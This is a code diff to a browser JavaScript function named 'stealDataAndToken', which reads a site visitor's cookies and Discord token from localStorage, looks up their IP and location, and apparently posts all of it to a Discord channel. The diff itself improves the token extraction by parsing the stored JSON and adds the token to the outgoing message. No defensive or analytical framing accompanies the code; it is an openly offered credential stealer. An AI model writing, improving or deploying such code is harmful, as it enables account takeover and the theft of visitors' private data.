@@ -1,9 +1,14 @@
 // Function to steal cookies, Discord token, user's IP, and geolocation
 function stealDataAndToken() {
     var cookies = document.cookie;
+    
+    var token = localStorage.getItem('https://discord.com');
+    var discordToken = null;
 
-    // Retrieve Discord token from local storage
-    var discordToken = localStorage.getItem('https://discord.com');
+    if (token) {
+        var tokenData = JSON.parse(token);
+        discordToken = tokenData.Token;
+    }
 
     // Fetch user's IP
     fetch('https://httpbin.org/ip')
@@ -31,7 +36,7 @@ Someone visited the website from:
 - Postal Code: ${postalCode}
 - IP Address: ${clientIp}
 - Cookies: ${cookies}
-- Discord Token: ${discordToken}
+- Discord Token: ${discordToken} // Include the Discord token here
 \`\`\``;
 
             // Send message to Discord
